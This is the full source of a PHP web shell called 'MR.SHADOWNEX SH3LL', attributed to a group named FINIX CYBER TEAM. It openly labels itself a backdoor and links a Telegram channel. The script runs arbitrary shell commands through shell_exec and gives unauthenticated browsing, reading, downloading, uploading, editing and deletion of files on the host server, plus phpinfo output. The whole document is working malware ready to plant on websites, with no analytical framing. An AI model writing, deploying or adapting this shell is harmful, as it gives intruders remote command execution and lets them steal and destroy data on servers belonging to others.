<?php
$logo = "https://files.catbox.moe/9zvij0.gif";
$title = "MR./SHADOWNEX SH3LL";
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if($current_dir === false) $current_dir = getcwd();

$message = '';
$msg_type = 'success';
if(isset($_GET['msg'])) {
    $msg_type = isset($_GET['type']) ? $_GET['type'] : 'success';
    $message = htmlspecialchars($_GET['msg']);
}

if(isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd'] . ' 2>&1');
}

if(isset($_GET['action'])) {
    $action = $_GET['action'];
    
    if($action == 'delete' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file)) {
            if(is_dir($file)) {
                $success = rmdir($file);
            } else {
                $success = unlink($file);
            }
            if($success) {
                header("Location: ?dir=" . urlencode($current_dir) . "&msg=" . urlencode("Item deleted") . "&type=success");
                exit;
            }
        }
    }
    
    if($action == 'download' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file) && !is_dir($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            readfile($file);
            exit;
        }
    }
    
    if($action == 'view' && isset($_GET['file'])) {
        $file = realpath($_GET['file']);
        if($file && file_exists($file) && !is_dir($file)) {
            header('Content-Type: text/plain');
            readfile($file);
            exit;
        }
    }
    
    if($action == 'phpinfo') {
        phpinfo();
        exit;
    }
}

if(isset($_POST['save']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $filename = realpath($_POST['filename']) ?: $_POST['filename'];
    if(file_put_contents($filename, $_POST['content'])) {
        $message = "File saved successfully";
        header("Location: ?dir=" . urlencode(dirname($filename)) . "&msg=" . urlencode($message) . "&type=success");
        exit;
    } else {
        $message = "Failed to save file";
        $msg_type = 'error';
    }
}

if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $target = $current_dir . '/' . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $message = "File uploaded successfully";
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=" . urlencode($message) . "&type=success");
        exit;
    } else {
        $message = "Failed to upload file";
        $msg_type = 'error';
    }
}

if(isset($_POST['create']) && isset($_POST['newfilename'])) {
    $fullpath = $current_dir . '/' . $_POST['newfilename'];
    $content = $_POST['newcontent'] ?? '';
    if(file_put_contents($fullpath, $content)) {
        $message = "File created successfully";
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=" . urlencode($message) . "&type=success");
        exit;
    } else {
        $message = "Failed to create file";
        $msg_type = 'error';
    }
}

function format_size($bytes) {
    if($bytes < 1024) return $bytes . ' B';
    if($bytes < 1048576) return round($bytes/1024, 1) . ' KB';
    if($bytes < 1073741824) return round($bytes/1048576, 1) . ' MB';
    return round($bytes/1073741824, 1) . ' GB';
}

$icon_upload = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/upload.svg";
$icon_file = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/file-earmark-plus.svg";
$icon_info = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/info-circle.svg";
$icon_php = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/filetype-php.svg";
$icon_folder = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/folder.svg";
$icon_folder_open = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/folder-symlink.svg";
$icon_edit = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/pencil.svg";
$icon_view = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/eye.svg";
$icon_download = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/download.svg";
$icon_delete = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/trash.svg";
$icon_execute = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/play-fill.svg";
$icon_success = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/check-circle.svg";
$icon_error = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/x-circle.svg";
$icon_filetype = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/file-earmark.svg";
$icon_arrow = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/arrow-return-right.svg";
$icon_telegram = "https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/icons/telegram.svg";
?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $title; ?></title>
<meta charset="UTF-8">
<style>
* { 
    margin: 0; 
    padding: 0; 
    box-sizing: border-box; 
    font-family: 'Segoe UI', system-ui, sans-serif; 
}
body { 
    background: #1a0f0f; 
    color: #e0c0c0; 
    padding: 15px;
    line-height: 1.5;
    min-height: 100vh;
}
.container { 
    max-width: 1200px; 
    margin: 0 auto;
    background: rgba(25, 15, 15, 0.8);
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 5px 20px rgba(150, 50, 50, 0.1);
}
.header { 
    text-align: center; 
    margin-bottom: 25px; 
    padding-bottom: 20px; 
    border-bottom: 1px solid rgba(200, 100, 100, 0.2); 
}
.logo { 
    width: 170px; 
    height: 170px; 
    border-radius: 10px;
    border: 2px solid #e67e7e;
    box-shadow: 0 0 15px rgba(230, 126, 126, 0.3);
}
h2 { 
    color: #e67e7e; 
    margin: 15px 0 10px; 
    font-weight: 300;
    font-size: 24px;
    letter-spacing: 1px;
}
.message {
    padding: 12px 15px;
    margin-bottom: 15px;
    border-radius: 6px;
    font-size: 14px;
    display: flex;
    align-items: center;
    gap: 10px;
}
.message.success {
    background: rgba(50, 120, 60, 0.2);
    border: 1px solid rgba(80, 200, 100, 0.3);
    color: #80ff80;
}
.message.error {
    background: rgba(120, 50, 50, 0.2);
    border: 1px solid rgba(200, 80, 80, 0.3);
    color: #ff8080;
}
.path { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 12px 15px; 
    margin-bottom: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3); 
    border-radius: 6px;
    font-size: 14px;
    display: flex;
    align-items: center;
    flex-wrap: wrap;
    gap: 5px;
}
.path a { 
    color: #e67e7e; 
    text-decoration: none; 
    padding: 3px 8px;
    border-radius: 4px;
}
.path a:hover { 
    color: #ff9999; 
    background: rgba(230, 126, 126, 0.1);
}
.toolbar { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 12px; 
    margin-bottom: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    display: flex; 
    gap: 10px; 
    flex-wrap: wrap; 
}
.toolbar input, .toolbar button { 
    padding: 8px 15px; 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    background: rgba(60, 30, 30, 0.8); 
    color: #e0c0c0; 
    border-radius: 5px;
    font-size: 14px;
}
.toolbar button { 
    cursor: pointer;
    background: linear-gradient(135deg, rgba(150, 60, 60, 0.8), rgba(120, 40, 40, 0.8));
    display: flex;
    align-items: center;
    gap: 8px;
}
.toolbar button:hover { 
    background: linear-gradient(135deg, rgba(180, 80, 80, 0.9), rgba(140, 50, 50, 0.9));
    color: #ffcccc; 
    border-color: #e67e7e;
}
.file-table { 
    width: 100%; 
    border-collapse: collapse; 
    margin-bottom: 25px;
    border-radius: 6px;
    overflow: hidden;
}
.file-table th { 
    background: linear-gradient(135deg, rgba(100, 40, 40, 0.9), rgba(80, 30, 30, 0.9));
    padding: 12px 15px; 
    text-align: left; 
    border: 1px solid rgba(200, 100, 100, 0.3); 
    color: #e0c0c0; 
    font-weight: 400;
    font-size: 13px;
}
.file-table td { 
    padding: 10px 15px; 
    border: 1px solid rgba(200, 100, 100, 0.2); 
    font-size: 13px;
}
.file-table tr:nth-child(even) { 
    background: rgba(50, 25, 25, 0.3); 
}
.file-table tr:hover { 
    background: rgba(230, 126, 126, 0.08); 
}
.file-table a { 
    color: #e67e7e; 
    text-decoration: none; 
    font-size: 12px; 
    margin-right: 8px;
    padding: 3px 8px;
    border-radius: 3px;
    display: inline-flex;
    align-items: center;
    gap: 5px;
}
.file-table a:hover { 
    color: #ff9999; 
    background: rgba(230, 126, 126, 0.1);
}
.cmd-form { 
    background: rgba(40, 20, 20, 0.7); 
    padding: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    margin-bottom: 20px; 
    display: flex;
    align-items: center;
    gap: 10px;
}
.cmd-form input[type="text"] { 
    flex: 1;
    padding: 10px; 
    background: rgba(60, 30, 30, 0.8); 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    border-radius: 5px;
    font-size: 14px;
}
.cmd-form button { 
    padding: 10px 20px; 
    background: linear-gradient(135deg, rgba(150, 60, 60, 0.8), rgba(120, 40, 40, 0.8));
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    cursor: pointer;
    border-radius: 5px;
    font-size: 14px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-form button:hover { 
    background: linear-gradient(135deg, rgba(180, 80, 80, 0.9), rgba(140, 50, 50, 0.9));
    color: #ffcccc;
}
.output { 
    background: rgba(30, 15, 15, 0.8); 
    padding: 15px; 
    border: 1px solid rgba(200, 100, 100, 0.3);
    border-radius: 6px;
    color: #e0c0c0; 
    white-space: pre-wrap; 
    max-height: 300px; 
    overflow-y: auto; 
    margin-bottom: 20px;
    font-family: 'Consolas', monospace;
    font-size: 13px;
}
.modal { 
    display: none; 
    position: fixed; 
    top: 0; 
    left: 0; 
    width: 100%; 
    height: 100%; 
    background: rgba(10, 5, 5, 0.85); 
    z-index: 1000;
}
.modal-content { 
    position: absolute; 
    top: 50%; 
    left: 50%; 
    transform: translate(-50%, -50%); 
    background: rgba(40, 20, 20, 0.95); 
    padding: 25px; 
    border: 1px solid rgba(230, 126, 126, 0.4);
    border-radius: 10px;
    width: 90%; 
    max-width: 800px; 
}
.modal textarea { 
    width: 100%; 
    height: 400px; 
    background: rgba(30, 15, 15, 0.8); 
    color: #e0c0c0; 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    padding: 15px; 
    font-family: 'Consolas', monospace; 
    resize: vertical;
    border-radius: 5px;
    font-size: 13px;
}
.modal input[type="text"] { 
    width: 100%; 
    padding: 10px; 
    margin-bottom: 15px; 
    background: rgba(30, 15, 15, 0.8); 
    border: 1px solid rgba(200, 100, 100, 0.4); 
    color: #e0c0c0; 
    border-radius: 5px;
}
.about-content { 
    color: #e0c0c0; 
    line-height: 1.6; 
    font-size: 14px; 
    padding: 10px 0;
}
.about-content h3 { 
    color: #e67e7e; 
    margin-bottom: 20px; 
    font-weight: 300;
    font-size: 20px;
    text-align: center;
}
.about-content p { 
    margin-bottom: 12px; 
    padding-left: 10px;
    border-left: 2px solid rgba(230, 126, 126, 0.3);
}
.about-content a { 
    color: #e67e7e; 
    text-decoration: none; 
    border-bottom: 1px dashed rgba(230, 126, 126, 0.5);
    display: inline-flex;
    align-items: center;
    gap: 8px;
}
.about-content a:hover { 
    color: #ff9999; 
}
.footer {
    text-align: center;
    padding: 20px 0 10px;
    color: #996666;
    font-size: 12px;
    border-top: 1px solid rgba(200, 100, 100, 0.1);
    margin-top: 20px;
}
.icon {
    width: 16px;
    height: 16px;
    vertical-align: middle;
    filter: invert(80%) sepia(30%) saturate(400%) hue-rotate(320deg) brightness(100%) contrast(90%);
}
.file-icon {
    width: 18px;
    height: 18px;
    margin-right: 8px;
    vertical-align: middle;
    filter: invert(80%) sepia(30%) saturate(400%) hue-rotate(320deg) brightness(100%) contrast(90%);
}
.message-icon {
    width: 20px;
    height: 20px;
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <img src="<?php echo $logo; ?>" class="logo" alt="Logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTcwIiBoZWlnaHQ9IjE3MCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIHJ4PSIxMCIgZmlsbD0iIzFlMGUwZSIvPjxwYXRoIGQ9Ik0yMCAzMEg4MFY0MEgyMFYzMFpNMjAgNTBINjBWNjBIMjBWNTBaTTIwIDcwSDgwVjgwSDIwVjcwWiIgZmlsbD0iI2U2N2U3ZSIvPjwvc3ZnPg=='">
        <h2><?php echo $title; ?></h2>
        <div style="color:#b88; font-size:13px;">
            <?php echo trim(shell_exec('whoami')) . '@' . gethostname() . ' | PHP ' . phpversion(); ?>
        </div>
    </div>

    <?php if($message): ?>
    <div class="message <?php echo $msg_type; ?>">
        <img src="<?php echo $msg_type == 'error' ? $icon_error : $icon_success; ?>" class="message-icon">
        <?php echo $message; ?>
    </div>
    <?php endif; ?>

    <div class="path">
        <?php
        $parts = explode('/', trim($current_dir, '/'));
        $path = '';
        foreach($parts as $i => $part) {
            if($part == '') continue;
            $path .= ($path ? '/' : '') . $part;
            echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>/';
        }
        ?>
        <span style="color:#e67e7e; font-size:13px; margin-left:10px;">
            (<?php echo is_dir($current_dir) ? count(scandir($current_dir))-2 : 0; ?> items)
        </span>
    </div>

    <div class="toolbar">
        <form method="GET" style="display:flex;gap:10px;flex:1;">
            <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="Enter path...">
            <button type="submit">
                <img src="<?php echo $icon_arrow; ?>" class="icon"> Go
            </button>
        </form>
        <button onclick="showModal('upload')">
            <img src="<?php echo $icon_upload; ?>" class="icon"> Upload
        </button>
        <button onclick="showModal('newfile')">
            <img src="<?php echo $icon_file; ?>" class="icon"> New File
        </button>
        <button onclick="showModal('about')">
            <img src="<?php echo $icon_info; ?>" class="icon"> About
        </button>
        <button onclick="window.open('?action=phpinfo', '_blank')">
            <img src="<?php echo $icon_php; ?>" class="icon"> PHP Info
        </button>
    </div>

    <table class="file-table">
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
        </tr>
        <?php
        if($current_dir != '/' && $current_dir != '') {
            $parent = dirname($current_dir);
            if($parent != $current_dir) {
                echo '<tr>
                    <td><a href="?dir=' . urlencode($parent) . '"><img src="' . $icon_folder . '" class="file-icon">..</a></td>
                    <td>-</td>
                    <td>-</td>
                    <td><a href="?dir=' . urlencode($parent) . '"><img src="' . $icon_folder_open . '" class="icon"></a></td>
                </tr>';
            }
        }
        
        if(is_dir($current_dir)) {
            $files = scandir($current_dir);
            usort($files, function($a, $b) use ($current_dir) {
                $a_is_dir = is_dir($current_dir . '/' . $a);
                $b_is_dir = is_dir($current_dir . '/' . $b);
                if($a_is_dir && !$b_is_dir) return -1;
                if(!$a_is_dir && $b_is_dir) return 1;
                return strcasecmp($a, $b);
            });
            
            foreach($files as $file) {
                if($file == '.' || $file == '..') continue;
                
                $fullpath = $current_dir . '/' . $file;
                $is_dir = is_dir($fullpath);
                $size = $is_dir ? '-' : format_size(filesize($fullpath));
                $modified = date('Y-m-d H:i', filemtime($fullpath));
                
                echo '<tr>';
                echo '<td>';
                if($is_dir) {
                    echo '<a href="?dir=' . urlencode($fullpath) . '"><img src="' . $icon_folder . '" class="file-icon">' . htmlspecialchars($file) . '</a>';
                } else {
                    echo '<img src="' . $icon_filetype . '" class="file-icon">' . htmlspecialchars($file);
                }
                echo '</td>';
                echo '<td>' . $size . '</td>';
                echo '<td>' . $modified . '</td>';
                echo '<td>';
                
                if($is_dir) {
                    echo '<a href="?dir=' . urlencode($fullpath) . '"><img src="' . $icon_folder_open . '" class="icon"></a> ';
                    echo '<a href="?action=delete&file=' . urlencode($fullpath) . '&dir=' . urlencode($current_dir) . '" onclick="return confirm(\'Delete folder ' . htmlspecialchars($file) . '?\')"><img src="' . $icon_delete . '" class="icon"></a>';
                } else {
                    echo '<a href="#" onclick="editFile(\'' . addslashes($fullpath) . '\')"><img src="' . $icon_edit . '" class="icon"></a> ';
                    echo '<a href="?action=view&file=' . urlencode($fullpath) . '" target="_blank"><img src="' . $icon_view . '" class="icon"></a> ';
                    echo '<a href="?action=download&file=' . urlencode($fullpath) . '"><img src="' . $icon_download . '" class="icon"></a> ';
                    echo '<a href="?action=delete&file=' . urlencode($fullpath) . '&dir=' . urlencode($current_dir) . '" onclick="return confirm(\'Delete file ' . htmlspecialchars($file) . '?\')"><img src="' . $icon_delete . '" class="icon"></a>';
                }
                
                echo '</td>';
                echo '</tr>';
            }
        } else {
            echo '<tr><td colspan="4" style="text-align:center;color:#e67e7e;padding:25px;font-size:14px;">Directory not found</td></tr>';
        }
        ?>
    </table>

    <form method="POST" class="cmd-form">
        <span style="color:#e67e7e;">$</span>
        <input type="text" name="cmd" placeholder="Enter command...">
        <button type="submit">
            <img src="<?php echo $icon_execute; ?>" class="icon"> Execute
        </button>
    </form>

    <?php if(isset($output)): ?>
    <div class="output">
        <strong style="color:#e67e7e;">$ <?php echo htmlspecialchars($_POST['cmd']); ?></strong><br><br>
        <?php echo htmlspecialchars($output); ?>
    </div>
    <?php endif; ?>

    <div class="footer">
        MR.SHADOWNEX SH3LL © <?php echo date('Y'); ?> | Simple & Powerful Backdoor
    </div>
</div>

<div id="uploadModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;"><img src="<?php echo $icon_upload; ?>" class="icon" style="width:24px;height:24px;"> Upload File</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" style="width:100%;margin-bottom:15px;color:#e0c0c0;padding:10px;background:rgba(30,15,15,0.8);border:1px solid rgba(200,100,100,0.4);border-radius:5px;">
            <div style="display:flex;gap:10px;">
                <button type="submit" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;display:flex;align-items:center;justify-content:center;gap:8px;">
                    <img src="<?php echo $icon_upload; ?>" class="icon"> Upload
                </button>
                <button type="button" onclick="hideModal('upload')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="editModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;"><img src="<?php echo $icon_edit; ?>" class="icon" style="width:24px;height:24px;"> Edit File</h3>
        <form method="POST">
            <input type="hidden" name="filename" id="edit_filename">
            <textarea name="content" id="edit_content"></textarea>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="save" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;display:flex;align-items:center;justify-content:center;gap:8px;">
                    <img src="<?php echo $icon_success; ?>" class="icon"> Save
                </button>
                <button type="button" onclick="hideModal('edit')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="newfileModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:15px;"><img src="<?php echo $icon_file; ?>" class="icon" style="width:24px;height:24px;"> Create New File</h3>
        <form method="POST">
            <input type="text" name="newfilename" placeholder="Filename (e.g., newfile.txt)" style="width:100%;margin-bottom:15px;padding:10px;background:rgba(30,15,15,0.8);border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;border-radius:5px;">
            <textarea name="newcontent" placeholder="Content (optional)" style="height:300px;"></textarea>
            <div style="display:flex;gap:10px;">
                <button type="submit" name="create" style="padding:10px 20px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(200,100,100,0.4);color:#e0c0c0;cursor:pointer;flex:1;border-radius:5px;display:flex;align-items:center;justify-content:center;gap:8px;">
                    <img src="<?php echo $icon_file; ?>" class="icon"> Create
                </button>
                <button type="button" onclick="hideModal('newfile')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Cancel</button>
            </div>
        </form>
    </div>
</div>

<div id="aboutModal" class="modal">
    <div class="modal-content">
        <h3 style="color:#e67e7e; margin-bottom:20px;"><img src="<?php echo $icon_info; ?>" class="icon" style="width:24px;height:24px;"> About MR.SHADOWNEX SH3LL</h3>
        <div class="about-content">
            <p><strong>Name:</strong> MR.SHADOWNEX SH3LL</p>
            <p><strong>Creator:</strong> MR.SHADOWNEX</p>
            <p><strong>Team:</strong> [FCT] FINIX CYBER TEAM</p>
            <p><strong>Date:</strong> FEBUARI 06, 2026</p>
            <p><strong>Version:</strong> 1.0</p>
            <p><strong>Description:</strong> Modern Backdoor shell</p>
            <p style="text-align:center;margin:25px 0;">
                <a href="https://t.me/+AUS9WwlpJAQ4ODI1" target="_blank" style="display:inline-flex;align-items:center;gap:10px;padding:12px 25px;background:linear-gradient(135deg, rgba(150,60,60,0.8), rgba(120,40,40,0.8));border:1px solid rgba(230,126,126,0.5);color:#ffcccc;text-decoration:none;border-radius:5px;font-size:14px;">
                    <img src="<?php echo $icon_telegram; ?>" class="icon" style="width:20px;height:20px;"> Join Our Telegram Channel
                </a>
            </p>
            <p style="color:#996666;font-size:12px;text-align:center;margin-top:20px;">
                We Are Party At Your Security.
            </p>
        </div>
        <div style="display:flex;gap:10px;margin-top:25px;">
            <button type="button" onclick="hideModal('about')" style="padding:10px 20px;background:rgba(60,30,30,0.8);border:1px solid rgba(200,100,100,0.4);color:#b88;cursor:pointer;flex:1;border-radius:5px;">Close</button>
        </div>
    </div>
</div>

<script>
function showModal(type) {
    document.getElementById(type + 'Modal').style.display = 'block';
}

function hideModal(type) {
    document.getElementById(type + 'Modal').style.display = 'none';
}

function editFile(filename) {
    fetch('?action=view&file=' + encodeURIComponent(filename))
        .then(response => response.text())
        .then(content => {
            document.getElementById('edit_filename').value = filename;
            document.getElementById('edit_content').value = content;
            showModal('edit');
        })
        .catch(error => {
            alert('Error loading file: ' + error);
        });
}

window.onclick = function(event) {
    if(event.target.className === 'modal') {
        event.target.style.display = 'none';
    }
}

setTimeout(function() {
    var message = document.querySelector('.message');
    if(message) {
        message.style.opacity = '1';
        setTimeout(function() {
            message.style.transition = 'opacity 0.5s';
            message.style.opacity = '0';
            setTimeout(function() {
                message.style.display = 'none';
            }, 500);
        }, 3000);
    }
}, 100);
</script>
</body>
</html>